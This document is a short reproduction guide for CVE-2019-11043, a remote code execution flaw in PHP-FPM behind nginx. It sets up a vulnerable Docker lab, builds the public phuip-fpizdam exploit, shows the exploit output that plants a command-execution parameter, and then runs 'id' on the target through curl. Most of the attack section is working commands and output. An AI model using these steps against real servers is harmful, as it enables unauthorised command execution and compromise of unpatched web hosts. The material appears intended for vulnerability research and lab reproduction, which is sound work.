# CVE-2019-11043

## Description

- PHP 5.6 : PHP-FPM Crash?紝DOS

- PHP 7.0 : RCE

- PHP 7.1 : RCE

- PHP 7.2 : RCE

- PHP 7.3 : RCE

| Item           | Value                                         | Remark |
| -------------- | --------------------------------------------- | ------ |
| Risk Level     | HIGH                                          |        |
| Attack Type    | Remote Code Execution                         |        |
| Attack Postion | URI                                           |        |
| Principle      | [Link](https://bugs.php.net/bug.php?id=78599) | %0A    |

## Environment

`php-fpm`:7.3.0 + `nginx`:1.14.2

```bash
# downlaod docker(include php-fpm and nginx)
docker pull lubinlew/cve-2019-11043

# run the docker
docker run -d -p 40080:80 --name cve-2019-11043 lubinlew/cve-2019-11043:latest
```

## Reappear

- Compile [POC](https://github.com/neex/phuip-fpizdam)
  
  ```bash
  git clone https://github.com/neex/phuip-fpizdam.git
  cd phuip-fpizdam
  go get -v && go build
  ```

- Run POC
  
  ```bash
  ./phuip-fpizdam http://<IP-Address>:40080/index.php
  
  2020/10/13 14:10:22 Base status code is 200
  2020/10/13 14:10:22 Status code 502 for qsl=1765, adding as a candidate
  2020/10/13 14:10:22 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
  2020/10/13 14:10:22 Attack params found: --qsl 1760 --pisos 49 --skip-detect
  2020/10/13 14:10:22 Trying to set "session.auto_start=0"...
  2020/10/13 14:10:22 Detect() returned attack params: --qsl 1760 --pisos 49 --skip-detect <-- REMEMBER THIS
  2020/10/13 14:10:22 Performing attack using php.ini settings...
  2020/10/13 14:10:22 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
  2020/10/13 14:10:22 Trying to cleanup /tmp/a...
  2020/10/13 14:10:22 Done!
  ```

- Now you can execute command with `?a=cmd`
  
  ```bash
  curl http://<IP-Address>:40080/index.php?a=id
  uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)
  Hello World!
  ```

## References

http://blog.leanote.com/post/snowming/9da184ef24bd

https://bugs.php.net/bug.php?id=78599

[GitHub - neex/phuip-fpizdam: Exploit for CVE-2019-11043](https://github.com/neex/phuip-fpizdam)
